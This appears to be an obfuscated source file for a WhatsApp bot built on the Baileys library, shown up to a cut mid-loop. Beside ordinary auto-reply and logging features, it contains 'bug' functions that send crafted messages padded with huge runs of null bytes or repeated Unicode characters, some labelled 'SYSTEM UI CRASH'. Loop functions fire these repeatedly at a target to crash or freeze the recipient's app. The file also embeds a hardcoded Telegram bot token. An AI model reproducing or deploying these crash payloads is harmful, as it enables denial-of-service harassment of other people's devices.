const {
  default: makeWASocket,
  fetchLatestBaileysVersion,
  downloadContentFromMessage,
  useMultiFileAuthState,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const os = require('os');
const fs = require('fs');
const fsx = require("fs-extra");
const util = require("util");
const chalk = require("chalk");
const moment = require('moment-timezone');
const speed = require("performance-now");
const axios = require("axios");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  performance
} = require("perf_hooks");
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime
} = require('./lib/uploader');
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar
} = require("./lib/converter");
const {
  smsg,
  getGroupAdmins,
  formatp,
  jam,
  formatDate,
  getTime,
  isUrl,
  await,
  sleep,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  runtime,
  fetchJson,
  getBuffer,
  json,
  delay,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  pickRandom,
  reSize
} = require("./lib/myfunc");
let afk = require("./lib/afk");
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  expiredCheck,
  checkPremiumUser,
  getAllPremiumUser
} = require('./lib/premiun');
const {
  fetchBuffer,
  buffergif
} = require('./lib/myfunc2');
const {
  xeontext1
} = require("./69/xeontext1");
const {
  xeontext11
} = require("./69/xeontext11");
let premium = JSON.parse(fs.readFileSync("./database/premium.json"));
let _owner = JSON.parse(fs.readFileSync("./database/owner.json"));
let owner = JSON.parse(fs.readFileSync('./database/owner.json'));
let _afk = JSON.parse(fs.readFileSync("./database/afk-user.json"));
let hit = JSON.parse(fs.readFileSync("./database/total-hit-user.json"));
const VoiceNoteXeon = JSON.parse(fs.readFileSync("./database/autoreply/vn.json"));
const StickerXeon = JSON.parse(fs.readFileSync("./database/autoreply/sticker.json"));
const ImageXeon = JSON.parse(fs.readFileSync("./database/autoreply/image.json"));
const VideoXeon = JSON.parse(fs.readFileSync("./database/autoreply/video.json"));
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'));
const ZipXeon = JSON.parse(fs.readFileSync("./database/autoreply/zip.json"));
const ApkXeon = JSON.parse(fs.readFileSync("./database/autoreply/apk.json"));
const time2 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
if (time2 < '23:59:00') {
  var xeonytimewisher = "Good Night 🌌";
}
if (time2 < "19:00:00") {
  var xeonytimewisher = "Good Evening 🌃";
}
if (time2 < "18:00:00") {
  var xeonytimewisher = "Good Evening 🌃";
}
if (time2 < '1:00:00') {
  var xeonytimewisher = "Good Afternoon 🌅";
}
if (time2 < "11:00:00") {
  var xeonytimewisher = "Good Morning 🌄";
}
if (time2 < '05:00:00') {
  var xeonytimewisher = "Good Morning 🌄";
}
module.exports = XeonBotInc = async (_0x2126c8, _0x5cfbb1, _0x5b403c, _0x2aced1, _0x30a13c) => {
  try {
    const {
      type: _0x49657d,
      quotedMsg: _0x4d3589,
      mentioned: _0x13cfb3,
      now: _0x538cfa,
      fromMe: _0x199051
    } = _0x5cfbb1;
    var _0x4c983c = _0x5cfbb1.mtype === "conversation" ? _0x5cfbb1.message.conversation : _0x5cfbb1.mtype == "imageMessage" ? _0x5cfbb1.message.imageMessage.caption : _0x5cfbb1.mtype == "videoMessage" ? _0x5cfbb1.message.videoMessage.caption : _0x5cfbb1.mtype == 'extendedTextMessage' ? _0x5cfbb1.message.extendedTextMessage.text : _0x5cfbb1.mtype == "buttonsResponseMessage" ? _0x5cfbb1.message.buttonsResponseMessage.selectedButtonId : _0x5cfbb1.mtype == 'listResponseMessage' ? _0x5cfbb1.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : _0x5cfbb1.mtype == "templateButtonreplygcxeonMessage" ? _0x5cfbb1.message.templateButtonreplygcxeonMessage.selectedId : _0x5cfbb1.mtype === 'messageContextInfo' ? _0x5cfbb1.message.buttonsResponseMessage?.["selectedButtonId"] || _0x5cfbb1.message.listResponseMessage?.["singleSelectreplygcxeon"]["selectedRowId"] || _0x5cfbb1.text : '';
    var _0x5328f2 = typeof _0x5cfbb1.text == 'string' ? _0x5cfbb1.text : '';
    var _0x2507cf = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x4c983c) ? _0x4c983c.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0x0] : '' : prefa ?? global.prefix;
    const _0x5ebe26 = _0x4c983c.replace(_0x2507cf, '').trim().split(/ +/).shift().toLowerCase();
    const _0x4f8c4e = _0x4c983c.trim().split(/ +/).slice(0x1);
    const _0x1d4e1b = _0x5cfbb1.pushName || "No Name";
    const _0x2a1e36 = await _0x2126c8.decodeJid(_0x2126c8.user.id);
    const _0x5454c7 = _0x5cfbb1.sender;
    const _0x5a4036 = q = _0x4f8c4e.join(" ");
    const _0x496a83 = _0x5cfbb1.key.remoteJid;
    const _0x3bd2d0 = _0x5cfbb1.quoted || _0x5cfbb1;
    const _0x1ea160 = _0x3bd2d0.mtype == "buttonsMessage" ? _0x3bd2d0[Object.keys(_0x3bd2d0)[0x1]] : _0x3bd2d0.mtype == "templateMessage" ? _0x3bd2d0.hydratedTemplate[Object.keys(_0x3bd2d0.hydratedTemplate)[0x1]] : _0x3bd2d0.mtype == "product" ? _0x3bd2d0[Object.keys(_0x3bd2d0)[0x0]] : _0x5cfbb1.quoted ? _0x5cfbb1.quoted : _0x5cfbb1;
    const _0x455bd4 = (_0x1ea160.msg || _0x1ea160).mimetype || '';
    const _0x584091 = _0x1ea160.msg || _0x1ea160;
    const _0x33529b = _0x49657d == 'videoMessage';
    const _0x5ad5d7 = afk.checkAfkUser(_0x5cfbb1.sender, _afk);
    const _0x3481d5 = _0x5cfbb1.isGroup ? await _0x2126c8.groupMetadata(_0x5cfbb1.chat)["catch"](_0x2596ea => {}) : '';
    const _0x1be0f4 = _0x5cfbb1.isGroup ? _0x3481d5.subject : '';
    const _0x425c8a = _0x5cfbb1.isGroup ? await _0x3481d5.participants : '';
    const _0x52e768 = _0x5cfbb1.isGroup ? await getGroupAdmins(_0x425c8a) : '';
    const _0x4be750 = _0x5cfbb1.isGroup ? _0x52e768.includes(_0x2a1e36) : false;
    const _0x105f82 = _0x5cfbb1.isGroup ? _0x52e768.includes(_0x5cfbb1.sender) : false;
    const _0x387f63 = _0x5cfbb1.isGroup ? _0x3481d5.owner : '';
    const _0x1afc0e = _0x5cfbb1.isGroup ? (_0x387f63 ? _0x387f63 : _0x52e768).includes(_0x5cfbb1.sender) : false;
    const _0x4fbeb2 = [ownernumber, ..._owner].map(_0xfa4bca => _0xfa4bca.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x5cfbb1.sender);
    const _0x573dd7 = _0x4fbeb2 || _0x4fbeb2 || checkPremiumUser(_0x5cfbb1.sender, premium);
    const _0x243f3a = _0x2126c8.user.id.split(':')[0x0];
    const _0x3a9958 = _0x5cfbb1.key.fromMe ? _0x2126c8.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x2126c8.user.id : _0x5cfbb1.key.participant || _0x5cfbb1.key.remoteJid;
    const _0x3be2a7 = _0x3a9958.split('@')[0x0];
    const _0x2c11b1 = _0x243f3a.includes(_0x3be2a7);
    expiredCheck(_0x2126c8, _0x5cfbb1, premium);
    const _0x36440f = _0x519f90 => {
      _0x2126c8.sendMessage(_0x5cfbb1.chat, {
        'text': _0x519f90,
        'contextInfo': {
          'mentionedJid': [_0x5454c7],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': " " + global.botname,
            'body': '' + ownername,
            'previewType': 'PHOTO',
            'thumbnailUrl': '',
            'thumbnail': fs.readFileSync('./XeonMedia/thumb.jpg'),
            'sourceUrl': '' + link
          }
        }
      }, {
        'quoted': _0x5cfbb1
      });
    };
    async function _0x360874(_0xf46d7b) {
      return new Promise(async (_0x37db46, _0x26962b) => {
        if (!_0xf46d7b.match(/(https:\/\/t.me\/addstickers\/)/gi)) {
          return _0x36440f("Enther your url telegram sticker link");
        }
        packName = _0xf46d7b.replace("https://t.me/addstickers/", '');
        data = await axios("https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=" + encodeURIComponent(packName), {
          'method': 'GET',
          'headers': {
            'User-Agent': "GoogleBot"
          }
        });
        const _0x1548e2 = [];
        for (let _0x1ba8d6 = 0x0; _0x1ba8d6 < data.data.result.stickers.length; _0x1ba8d6++) {
          fileId = data.data.result.stickers[_0x1ba8d6].thumb.file_id;
          data2 = await axios('https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=' + fileId);
          result = {
            'status': 0xc8,
            'author': "Danny",
            'url': "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
          };
          _0x1548e2.push(result);
        }
        _0x37db46(_0x1548e2);
      });
    }
    const _0x4c3be9 = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x5cfbb1.chat ? {
          'remoteJid': 'status@broadcast'
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync('./69/xx1.png')
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': "review_and_pay",
              'buttonParamsJson': "{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🇹🇿Danny praisy 🇹🇿Danny Praisy 🇹🇿Danny Praisy\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x34ada6 = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x5cfbb1.chat ? {
          'remoteJid': 'status@broadcast'
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync('./69/xx1.png')
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'review_and_pay',
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # Danny𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x5a2320 = {
      'key': {
        'participant': '0@s.whatsapp.net',
        ...(_0x5cfbb1.chat ? {
          'remoteJid': 'status@broadcast'
        } : {})
      },
      'message': {
        'listResponseMessage': {
          'title': "Danny"
        }
      }
    };
    async function _0x3117f6(_0x35a3d7, _0x3efc9a) {
      var _0x315d85 = generateWAMessageFromContent(_0x35a3d7, proto.Message.fromObject({
        'stickerMessage': {
          'url': 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true',
          'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          'mediaKey': '4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=',
          'mimetype': 'image/webp',
          'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          'fileLength': '10116',
          'mediaKeyTimestamp': "1715876003",
          'isAnimated': true,
          'stickerSentTs': "1715881084144",
          'isAvatar': true,
          'isAiSticker': true,
          'isLottie': false
        }
      }), {
        'userJid': _0x35a3d7,
        'quoted': _0x3efc9a
      });
      await _0x2126c8.relayMessage(_0x35a3d7, _0x315d85.message, {
        'participant': {
          'jid': _0x35a3d7
        },
        'messageId': _0x315d85.key.id
      });
    }
    async function _0x3cfec1(_0x527b18, _0x1d0284) {
      var _0x31bacd = generateWAMessageFromContent(_0x527b18, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "🇹🇿Danny praisy 🇹🇿Danny praisy 🇹🇿Danny praisy🇹🇿Danny praiay 🇹🇿Danny praisy🇹🇿Danny praisy 🇹🇿Danny praisy" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x527b18,
        'quoted': _0x1d0284
      });
      await _0x2126c8.relayMessage(_0x527b18, _0x31bacd.message, {
        'participant': {
          'jid': _0x527b18
        },
        'messageId': _0x31bacd.key.id
      });
    }
    async function _0x572f91(_0xcd5117, _0x38a63e) {
      var _0x1f9267 = generateWAMessageFromContent(_0xcd5117, proto.Message.fromObject({
        'interactiveMessage': {
          'header': {
            'title': " Danny",
            'hasMediaAttachment': true,
            ...(await prepareWAMessageMedia({
              'image': {
                'url': "https://i.ibb.co/Wppj16p/cheemspic.jpg"
              }
            }, {
              'upload': _0x2126c8.waUploadToServer
            }))
          },
          'body': {
            'text': ''
          },
          'footer': {
            'text': "›          #Danny"
          },
          'nativeFlowMessage': {
            'messageParamsJson': "\0".repeat(0xf4240)
          }
        }
      }), {
        'userJid': _0xcd5117,
        'quoted': _0x38a63e
      });
      await _0x2126c8.relayMessage(_0xcd5117, _0x1f9267.message, {
        'participant': {
          'jid': _0xcd5117
        },
        'messageId': _0x1f9267.key.id
      });
    }
    async function _0xa1b913(_0x488583) {
      await _0x2126c8.relayMessage(_0x488583, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {
        'participant': {
          'jid': _0x488583
        }
      });
    }
    async function _0x2f5165(_0x4563ee, _0x52c7f1) {
      var _0x5a1697 = generateWAMessageFromContent(_0x4563ee, proto.Message.fromObject({
        'listMessage': {
          'title': "Danny praisy" + "\0".repeat(0xe09c0),
          'footerText': "Danny oraisy 🇹🇿Danny Praisy🇹🇿Danny Praisy🇹🇿Danny Praisy 🇹🇿Danny Praisy 🇹🇿Danny Praisy 🇹🇿Danny Praisy",
          'description': "🇹🇿Danny Praiay 🇹🇿Danny Praisy 🇹🇿Danny Praisy 🇹🇿Danny Praiay 🇹🇿Danny Praisy 🇹🇿Danny Praiay 🇹🇿Danny Praisy",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': 'puki',
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': 'global_search_new_chat',
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x4563ee,
        'quoted': _0x5a2320
      });
      await _0x2126c8.relayMessage(_0x4563ee, _0x5a1697.message, {
        'participant': {
          'jid': _0x4563ee
        },
        'messageId': _0x5a1697.key.id
      });
    }
    const _0x2bd5de = async _0xeb75c => {
      _0x2126c8.sendMessage(_0x5cfbb1.chat, {
        'react': {
          'text': _0xeb75c,
          'key': _0x5cfbb1.key
        }
      });
    };
    async function _0x138f91(_0x2b6ca6, _0x21a30e) {
      for (let _0x4e844e = 0x0; _0x4e844e < _0x21a30e; _0x4e844e++) {
        let _0x4c18d7 = generateWAMessageFromContent(_0x2b6ca6, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': ''
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': ''
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': '',
                  'subtitle': '',
                  'hasMediaAttachment': false
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                  }],
                  'messageParamsJson': "\0".repeat(0x186a0)
                })
              })
            }
          }
        }, {});
        _0x2126c8.relayMessage(_0x2b6ca6, _0x4c18d7.message, {
          'messageId': _0x4c18d7.key.id
        });
      }
    }
    async function _0x34aac2(_0x3e22b8) {
      var _0x232f7f = generateWAMessageFromContent(_0x3e22b8, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
              },
              'footer': {
                'text': 'xp'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(0xf4240)
              }
            }
          }
        }
      }), {
        'userJid': _0x3e22b8
      });
      await _0x2126c8.relayMessage(_0x3e22b8, _0x232f7f.message, {
        'participant': {
          'jid': _0x3e22b8
        },
        'messageId': _0x232f7f.key.id
      });
    }
    async function _0x354c3d(_0x206a82) {
      var _0x4e03cb = generateWAMessageFromContent(_0x206a82, proto.Message.fromObject({
        'listMessage': {
          'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(0xe09c0),
          'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': 'lol',
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': 'INITIATED_BY_ME'
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x206a82
      });
      await _0x2126c8.relayMessage(_0x206a82, _0x4e03cb.message, {
        'participant': {
          'jid': _0x206a82
        },
        'messageId': _0x4e03cb.key.id
      });
    }
    async function _0x3cb5ca(_0x4f1f17) {
      var _0x4f8932 = generateWAMessageFromContent(_0x4f1f17, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "Creepytech" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x4f1f17
      });
      await _0x2126c8.relayMessage(_0x4f1f17, _0x4f8932.message, {
        'participant': {
          'jid': _0x4f1f17
        },
        'messageId': _0x4f8932.key.id
      });
    }
    async function _0x594aa9(_0x23c129) {
      _0x2126c8.relayMessage(_0x23c129, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0x23c129,
            'participant': _0x23c129,
            'quotedMessage': {
              'conversation': "This id Danny" + 'ꦾ'.repeat(0xc350)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': 'CHAT_SETTING'
            }
          },
          'inviteLinkGroupTypeV2': 'DEFAULT'
        }
      }, {
        'participant': {
          'jid': _0x23c129
        }
      }, {
        'messageId': null
      });
    }
    async function _0x30fde2(_0x3fbb25) {
      _0x2126c8.relayMessage(_0x3fbb25, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'expiryTimestamp': Date.now() + 0x5265c00
        }
      }, {
        'participant': {
          'jid': _0x3fbb25
        }
      });
    }
    async function _0x582cb9(_0x293c26, _0x4ed4cb) {
      for (let _0x1b7ee7 = 0x0; _0x1b7ee7 < _0x4ed4cb; _0x1b7ee7++) {
        _0x30fde2(_0x293c26);
        _0x594aa9(_0x293c26);
        await sleep(0x1f4);
      }
    }
    async function _0x3121c1(_0x21bd0f, _0x2734dd) {
      for (let _0x485694 = 0x0; _0x485694 < _0x2734dd; _0x485694++) {
        _0x354c3d(_0x21bd0f);
        _0x3cb5ca(_0x21bd0f);
        _0x34aac2(_0x21bd0f);
        await sleep(0x1f4);
      }
    }
    async function _0x5b8869(_0x281fce, _0x2b07ac) {
      for (let _0x296228 = 0x0; _0x296228 < _0x2b07ac; _0x296228++) {
        _0x34aac2(_0x281fce);
        _0x34aac2(_0x281fce);
        _0x34aac2(_0x281fce);
        await sleep(0x1f4);
      }
    }
    async function _0x38ccf6(_0x214cd2, _0xaf5c8d) {
      for (let _0x59641a = 0x0; _0x59641a < _0xaf5c8d; _0x59641a++) {
        _0x3cb5ca(_0x214cd2);
        _0x354c3d(_0x214cd2);
        await sleep(0x1f4);
      }
    }
    function _0x50a05f(_0x479273, _0x157479 = [], _0x1b6d42 = false) {
      return _0x1b6d42 == null || _0x1b6d42 == undefined || _0x1b6d42 == false ? _0x2126c8.sendMessage(_0x5cfbb1.chat, {
        'text': _0x479273,
        'mentions': _0x157479
      }, {
        'quoted': _0x5cfbb1
      }) : _0x2126c8.sendMessage(_0x5cfbb1.chat, {
        'text': _0x479273,
        'mentions': _0x157479
      }, {
        'quoted': _0x5cfbb1
      });
    }
    const _0x17cf09 = _0x28eff6 => {
      _0x2126c8.sendMessage(_0x496a83, {
        'text': _0x28eff6,
        'mentions': [_0x5454c7]
      }, {
        'quoted': _0x5cfbb1
      })["catch"](_0x1d3026 => {
        return reply("Erro..");
      });
    };
    async function _0x54ca09() {
      var _0x21b521 = ["《 █▒▒▒▒▒▒▒▒▒▒▒》10%", "《 ████▒▒▒▒▒▒▒▒》30%", "《 ███████▒▒▒▒▒》50%", "《 ██████████▒▒》80%", "《 ████████████》100%", "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ..."];
      let {
        key: _0x391d43
      } = await _0x2126c8.sendMessage(_0x496a83, {
        'text': 'ʟᴏᴀᴅɪɴɢ...'
      });
      for (let _0x10122b = 0x0; _0x10122b < _0x21b521.length; _0x10122b++) {
        await _0x2126c8.sendMessage(_0x496a83, {
          'text': _0x21b521[_0x10122b],
          'edit': _0x391d43
        });
      }
    }
    if (!_0x2126c8["public"]) {
      if (!_0x4fbeb2 && !_0x5cfbb1.key.fromMe) {
        return;
      }
    }
    if (autoread) {
      _0x2126c8.readMessages([_0x5cfbb1.key]);
    }
    if (global.autoTyping) {
      _0x2126c8.sendPresenceUpdate('composing', _0x496a83);
    }
    if (global.autoRecording) {
      _0x2126c8.sendPresenceUpdate('recording', _0x496a83);
    }
    _0x2126c8.sendPresenceUpdate('uavailable', _0x496a83);
    if (global.autorecordtype) {
      let _0x32976d = ["recording", "composing"];
      let _0x4d7909 = _0x32976d[Math.floor(Math.random() * _0x32976d.length)];
      _0x2126c8.sendPresenceUpdate(_0x4d7909, _0x496a83);
    }
    if (autobio) {
      _0x2126c8.updateProfileStatus("24/7 Online Bot By " + ownername)["catch"](_0x1fc249 => _0x1fc249);
    }
    if (_0x5cfbb1.sender.startsWith('92') && global.anti92 === true) {
      return _0x2126c8.updateBlockStatus(_0x5cfbb1.sender, 'block');
    }
    let _0x27123e = [];
    for (let _0x5b62b7 of owner) {
      _0x27123e.push({
        'displayName': await _0x2126c8.getName(_0x5b62b7),
        'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:" + (await _0x2126c8.getName(_0x5b62b7)) + "\nFN:" + (await _0x2126c8.getName(_0x5b62b7)) + "\nitem1.TEL;waid=" + _0x5b62b7 + ':' + _0x5b62b7 + "\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:" + ytname + "\nitem2.X-ABLabel:YouTube\nitem3.URL:" + socialm + "\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;" + location + ";;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      });
    }
    if (_0x5cfbb1.message && _0x5cfbb1.isGroup) {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Group Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x5328f2 || _0x5cfbb1.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0x1d4e1b), chalk.yellow(_0x5cfbb1.sender) + "\n" + chalk.blueBright("=> In"), chalk.green(_0x1be0f4, _0x5cfbb1.chat));
    } else {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Private Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x5328f2 || _0x5cfbb1.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0x1d4e1b), chalk.yellow(_0x5cfbb1.sender));
    }
    if (_0x5ebe26) {
      const _0x4454cc = () => {
        hit[0x0].hit_cmd += 0x1;
        fs.writeFileSync("./database/total-hit-user.json", JSON.stringify(hit));
      };
      _0x4454cc();
    }
    for (let _0x306a7e of VoiceNoteXeon) {
      if (_0x5328f2 === _0x306a7e) {
        let _0x371761 = fs.readFileSync("./XeonMedia/audio/" + _0x306a7e + '.mp3');
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'audio': _0x371761,
          'mimetype': "audio/mp4",
          'ptt': true
        }, {
          'quoted': _0x5cfbb1
        });
      }
    }
    for (let _0xe51944 of StickerXeon) {
      if (_0x5328f2 === _0xe51944) {
        let _0x2ea978 = fs.readFileSync("./XeonMedia/sticker/" + _0xe51944 + ".webp");
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'sticker': _0x2ea978
        }, {
          'quoted': _0x5cfbb1
        });
      }
    }
    for (let _0x390033 of ImageXeon) {
      if (_0x5328f2 === _0x390033) {
        let _0x4f451c = fs.readFileSync("./XeonMedia/image/" + _0x390033 + ".jpg");
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'image': _0x4f451c
        }, {
          'quoted': _0x5cfbb1
        });
      }
    }
    for (let _0x402a95 of VideoXeon) {
      if (_0x5328f2 === _0x402a95) {
        let _0x2ae136 = fs.readFileSync('./XeonMedia/video/' + _0x402a95 + ".mp4");
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'video': _0x2ae136
        }, {
          'quoted': _0x5cfbb1
        });
      }
    }
    const _0x4bd241 = _0x31782d => {
      _0x2126c8.sendMessage(_0x496a83, {
        'document': _0x31782d,
        'mimetype': "application/vnd.android.package-archive"
      }, {
        'quoted': _0x5cfbb1
      });
    };
    for (let _0x4c1258 of ApkXeon) {
